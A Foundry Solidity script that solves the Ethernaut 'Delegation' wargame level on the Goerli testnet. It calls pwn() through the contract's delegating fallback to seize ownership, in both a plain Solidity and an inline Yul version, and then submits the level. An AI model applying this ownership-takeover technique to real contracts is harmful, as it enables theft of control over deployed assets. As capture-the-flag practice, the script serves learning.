// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function owner() external view returns (address);

    function pwn() external;
}

contract DelegationScript is EthernautScript {
    string network = "goerli";
    address level = 0xF781b45d11A37c51aabBa1197B61e6397aDf1f78;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        console.log("previous owner: ", instance.owner());
        instance.pwn();
        console.log("owner: ", instance.owner());
    }

    function yulVersion() internal {
        assembly {
            let delegation := sload(instance.slot)

            mstore(0, "pwn()")
            mstore(0, keccak256(0, 5))
            let success := call(gas(), delegation, 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "owner()")
            mstore(0, keccak256(0, 7))
            pop(staticcall(gas(), delegation, 0, 4, 0, 0x20))
            if iszero(eq(mload(0), sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
